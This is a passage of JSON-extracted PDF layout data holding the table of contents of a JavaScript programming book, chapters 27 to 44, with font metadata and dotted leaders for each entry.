        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 27: Inheritance   206",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 27.1: Standard function prototype   206",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 27.2: Di\ue023erence between Object.key and Object.prototype.key   206",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 27.3: Prototypal inheritance   206",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 27.4: Pseudo-classical inheritance   207",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 27.5: Setting an Object's prototype   208",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 28: Method Chaining   210",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 28.1: Chainable object design and chaining   210",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 28.2: Method Chaining   212",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 29: Callbacks   213",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.1: Simple Callback Usage Examples   213",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.2: Continuation (synchronous and asynchronous)   214",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.3: What is a callback?   215",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.4: Callbacks and `this`   216",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.5: Callback using Arrow function   217",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 29.6: Error handling and control-\ufb02ow branching   218",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 30: Intervals and Timeouts   219",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.1: Recursive setTimeout   219",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.2: Intervals   219",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.3: Intervals   219",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.4: Removing intervals   220",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.5: Removing timeouts   220",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 30.6: setTimeout, order of operations, clearTimeout   220",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 31: Regular expressions   222",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.1: Creating a RegExp Object   222",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.2: RegExp Flags   222",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.3: Check if string contains pattern using .test()   223",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.4: Matching With .exec()   223",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.5: Using RegExp With Strings   223",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.6: RegExp Groups   224",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.7: Replacing string match with a callback function   225",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 31.8: Using Regex.exec() with parentheses regex to extract matches of a string   226",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 32: Cookies   228",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 32.1: Test if cookies are enabled   228",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 32.2: Adding and Setting Cookies   228",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 32.3: Reading cookies   228",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 32.4: Removing cookies   228",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 33: Web Storage   229",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.1: Using localStorage   229",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.2: Simpler way of handling Storage   229",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.3: Storage events   230",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.4: sessionStorage   231",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.5: localStorage length   232",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.6: Error conditions   232",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.7: Clearing storage   232",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 33.8: Remove Storage Item   232",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 34: Data attributes  ",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................... 233",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 34.1: Accessing data attributes   233",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 35: JSON   234",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.1: JSON versus JavaScript literals   234",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.2: Parsing with a reviver function   235",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.3: Serializing a value   236",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.4: Serializing and restoring class instances   237",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.5: Serializing with a replacer function   238",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.6: Parsing a simple JSON string   239",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 35.7: Cyclic object values   239",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 36: AJAX   240",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.1: Sending and Receiving JSON Data via POST   240",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.2: Add an AJAX preloader   240",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.3: Displaying the top JavaScript questions of the month from Stack Over\ufb02ow's API   241",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.4: Using GET with parameters   242",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.5: Check if a \ufb01le exists via a HEAD request   243",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.6: Using GET and no parameters   243",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 36.7: Listening to AJAX events at a global level   243",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 37: Enumerations   244",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.1: Enum de\ufb01nition using Object.freeze()   244",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.2: Alternate de\ufb01nition   244",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.3: Printing an enum variable   244",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.4: Implementing Enums Using Symbols   245",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.5: Automatic Enumeration Value   245",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 38: Map   247",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.1: Creating a Map   247",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.2: Clearing a Map   247",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.3: Removing an element from a Map   247",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.4: Checking if a key exists in a Map   248",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.5: Iterating Maps   248",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.6: Getting and setting elements   248",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.7: Getting the number of elements of a Map   249",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 39: Timestamps   250",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 39.1: High-resolution timestamps   250",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 39.2: Get Timestamp in Seconds   250",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 39.3: Low-resolution timestamps   250",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 39.4: Support for legacy browsers   250",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 40: Unary Operators   251",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.1: Overview   251",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.2: The typeof operator   251",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.3: The delete operator   252",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.4: The unary plus operator (+)   253",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.5: The void operator   254",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.6: The unary negation operator (-)   255",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.7: The bitwise NOT operator (~)   255",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.8: The logical NOT operator (!)   256",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 41: Generators   258",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.1: Generator Functions   258",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.2: Sending Values to Generator   259",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.3: Delegating to other Generator  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................... 259",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.4: Iteration   259",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.5: Async \ufb02ow with generators   260",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.6: Iterator-Observer interface   261",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 42: Promises   263",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.1: Introduction   263",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.2: Promise chaining   264",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.3: Waiting for multiple concurrent promises   265",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.4: Reduce an array to chained promises   266",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.5: Waiting for the \ufb01rst of multiple concurrent promises   267",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.6: \"Promisifying\" functions with callbacks   268",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.7: Error Handling   268",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.8: Reconciling synchronous and asynchronous operations   272",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.9: Delay function call   273",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.10: \"Promisifying\" values   273",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.11: Using ES2017 async/await   274",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.12: Performing cleanup with \ufb01nally()   274",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.13: forEach with promises   275",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.14: Asynchronous API request   275",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 43: Set   277",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .......................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.1: Creating a Set   277",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.2: Adding a value to a Set   277",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.3: Removing value from a set   277",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.4: Checking if a value exist in a set   278",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.5: Clearing a Set   278",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.6: Getting set length   278",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.7: Converting Sets to arrays   278",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.8: Intersection and di\ue023erence in Sets   279",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.9: Iterating Sets   279",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 44: Modals - Prompts   280",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.1: About User Prompts   280",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
